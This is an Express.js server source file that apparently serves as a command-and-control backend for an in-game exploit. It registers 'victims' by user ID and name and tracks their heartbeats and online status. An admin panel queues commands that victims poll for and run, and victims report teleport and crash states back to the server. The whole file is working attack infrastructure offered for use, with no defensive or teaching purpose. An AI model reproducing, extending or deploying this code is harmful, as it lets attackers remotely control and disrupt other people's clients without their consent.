const express = require('express');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// In-memory data store (resets on server restart)
let victims = {};
let totalCaptured = 0;
const SESSIONS_SHOWN = 200;

// --- API ENDPOINTS ---

// 1. Victim Registration
app.post('/api/register', (req, res) => {
    const { userId, userName, executor = 'Unknown' } = req.body;
    if (!userId || !userName) {
        return res.status(400).json({ error: 'Missing userId or userName' });
    }

    if (!victims[userId]) {
        totalCaptured++;
    }

    victims[userId] = {
        userId,
        userName,
        executor,
        lastSeen: Date.now(),
        firstSeen: victims[userId]?.firstSeen || Date.now(),
        tpActive: false,
        crashActive: false,
        pendingCommand: null,
        online: true
    };

    console.log(`[REGISTER] ${userName} (${userId}) - ${executor}`);
    res.json({ status: 'registered', total: totalCaptured });
});

// 2. Heartbeat (keeps victim online)
app.post('/api/heartbeat', (req, res) => {
    const { userId } = req.body;
    if (victims[userId]) {
        victims[userId].lastSeen = Date.now();
        victims[userId].online = true;
        res.json({ status: 'ok' });
    } else {
        res.status(404).json({ error: 'Victim not found' });
    }
});

// 3. Get Victim List (for frontend)
app.get('/api/victims', (req, res) => {
    const now = Date.now();
    const ONLINE_THRESHOLD = 60000; // 60 seconds

    // Update online status
    for (const id in victims) {
        if (now - victims[id].lastSeen > ONLINE_THRESHOLD) {
            victims[id].online = false;
        }
    }

    const onlineCount = Object.values(victims).filter(v => v.online).length;

    // Return a limited list of recent or online victims
    const victimList = Object.values(victims)
        .filter(v => v.online || (now - v.lastSeen < 300000)) // Show online or recent (5 min)
        .slice(0, SESSIONS_SHOWN);

    res.json({
        online: onlineCount,
        total: totalCaptured,
        sessions: SESSIONS_SHOWN,
        victims: victimList
    });
});

// 4. Send Command (from your admin panel)
app.post('/api/command', (req, res) => {
    const { userId, command } = req.body;
    if (!userId || !command) {
        return res.status(400).json({ error: 'Missing userId or command' });
    }
    if (!victims[userId]) {
        return res.status(404).json({ error: 'Victim not found' });
    }

    // Store the command for the victim to pick up
    victims[userId].pendingCommand = command;
    console.log(`[COMMAND] ${userId} -> ${command}`);
    res.json({ status: 'command_sent' });
});

// 5. Victim Polling (for commands)
app.get('/api/poll', (req, res) => {
    const { userId } = req.query;
    if (!userId || !victims[userId]) {
        return res.status(404).json({ error: 'Victim not found' });
    }

    const victim = victims[userId];
    const command = victim.pendingCommand || null;
    if (command) {
        victim.pendingCommand = null; // Clear after reading
    }

    // Update online status
    victim.lastSeen = Date.now();
    victim.online = true;

    res.json({
        command: command,
        tpActive: victim.tpActive,
        crashActive: victim.crashActive
    });
});

// 6. Update Victim State (from victim)
app.post('/api/state', (req, res) => {
    const { userId, tpActive, crashActive } = req.body;
    if (victims[userId]) {
        if (tpActive !== undefined) victims[userId].tpActive = tpActive;
        if (crashActive !== undefined) victims[userId].crashActive = crashActive;
        res.json({ status: 'ok' });
    } else {
        res.status(404).json({ error: 'Victim not found' });
    }
});

// Start Server
app.listen(PORT, () => {
    console.log(`🚀 Admin Tracker running on http://localhost:${PORT}`);
});
